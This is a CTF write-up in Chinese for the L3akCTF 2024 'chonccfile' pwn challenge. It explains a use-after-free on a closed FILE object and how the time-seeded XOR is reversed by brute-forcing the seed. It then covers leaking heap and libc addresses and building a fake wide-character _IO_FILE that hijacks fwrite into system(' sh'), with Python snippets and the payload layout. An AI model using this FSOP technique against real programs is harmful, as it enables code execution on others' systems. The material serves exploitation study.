# L3akCTF 2024 chonccfile Writeup

## 题目简述

程序维护若干 `choncc` 堆对象，并可把内容写入 `/tmp/chonccfile`。全局变量保存 `FILE *`：

```c
FILE *choncc_file_stream = NULL;
```

关闭文件时调用 `fclose`，却没有把指针清零；随后还在已经释放的 `FILE` 对象上逐 4 字节异或：

```c
fclose(choncc_file_stream);
for (int i = 0; i < 0x1d0; i += sizeof(int)) {
    usleep(rand() % 100000);
    *(int *)((unsigned char *)choncc_file_stream + i) ^= rand();
}
```

因此这里同时存在 `FILE` 结构体的 use-after-free 和可预测 XOR。申请同尺寸内容块即可重新占用该堆块，先解密并泄露堆、libc 指针，再把它改造成恶意 `_IO_FILE`，最终通过 `fwrite` 触发 FSOP。

## 解题过程

### 1. 回收已释放的 FILE 堆块

依次执行：

```text
open chonccfile
close chonccfile
save 后选择 n 取消
create choncc，内容大小 0x1d0
view choncc
```

glibc 为 `FILE` 分配的用户区恰好可由 `malloc(0x1d0)` 回收，因此新 `choncc->str` 与旧 `FILE` 重叠。查看它会得到异或后的 0x1d0 字节。

`save_chonccfile` 会打印当前 Unix 时间，而进程在启动时用 `srand(time(NULL))` 播种。关闭函数每轮先为 `usleep` 调一次 `rand()`，再取第二次结果做 XOR。由于播种时间略早于打印时间，可从打印值向前枚举：

```python
while True:
    libc.srand(timestamp)
    plain = b""

    for off in range(0, 0x1d0, 4):
        libc.rand()  # usleep 使用的值
        plain += p32(u32(cipher[off:off + 4]) ^ libc.rand())

    if plain.count(b"\x00") > len(plain) // 2:
        break
    timestamp -= 1
```

关闭后的 `FILE` 结构体大部分字段为零，故“零字节超过一半”可以作为找到正确种子的判据。

### 2. 计算堆地址和 libc 基址

题目附带的 libc 中，解密结构体的 `_wide_data` 字段位于偏移 `0x88`，它指向与 `FILE` 相邻的位置；`_chain` 字段位于 `0x68`，保留了 `stderr` 地址。官方脚本据此计算：

```python
fp = u64(plain[0x88:0x90]) - 0xe0
libc_base = u64(plain[0x68:0x70]) - 0x1f04e0
```

这些偏移与符号差值只适用于题目提供的 libc，迁移到其他版本时必须重新从结构定义和符号表确认。

### 3. 伪造宽字符 FILE 调用链

直接篡改普通 `_IO_FILE_plus` 的 vtable 会遭到 glibc 校验。利用改走宽字符路径：

1. 令主 vtable 指向合法的 `_IO_wfile_jumps` 中部，使 `fwrite` 进入 `_IO_wfile_overflow`；
2. 令 `_wide_data` 指回当前可控堆块附近，把同一块内存同时解释为 `_IO_wide_data`；
3. 构造假的 `_wide_vtable`，把偏移 `0x68` 的函数指针设为 `system`；
4. 令 `_lock` 指向可写地址，并满足 `_IO_write_base`、`_IO_buf_base` 等路径条件；
5. 在结构体开头写入 `" sh\x00"`，使后续间接调用等价于 `system(fp)`。

核心字段在官方 exploit 中体现为：

```python
fake  = p64(0x687320)             # " sh\x00"
fake += ...                       # 清零读写与缓冲字段
fake += p64(fp + 0x68)            # 可写的 _lock
fake += ...
fake += p64(fp - 0x10)            # 重叠的 _wide_data
fake += ...
fake += p64(libc_base + 0x5306e)  # system
fake += p64(fp + 0x60)            # fake _wide_vtable
fake += p64(libc_base + 0x1ee2b0) # 合法宽字符 vtable 位置
```

编辑重叠的 `choncc` 写入伪造结构，再真正执行保存操作。`save_chonccfile` 调用 `fwrite`，控制流经过：

```text
fwrite
-> _IO_wfile_overflow
-> _IO_wdoallocbuf
-> fake _wide_vtable[0x68]
-> system(" sh")
```

取得 shell 后读取：

```text
L3AK{C0rRuPt3d_FIL3_structs_L0V3_CH0NCC_D474}
```

## 方法总结

- `fclose` 后不清空全局指针会留下 UAF；本题又主动写入该对象，使重新分配后的内容可读、可写。
- 时间种子 PRNG 不能保护内存。只要知道大致时间和调用次数，便可枚举种子并用结构体稀疏性验证结果。
- 新版 glibc 的普通 FILE vtable 有合法性校验，但 `_wide_data->_wide_vtable` 历史上是常见绕过面。构造时必须同时满足锁、缓冲区和宽字符状态条件，不能只改一个函数指针。
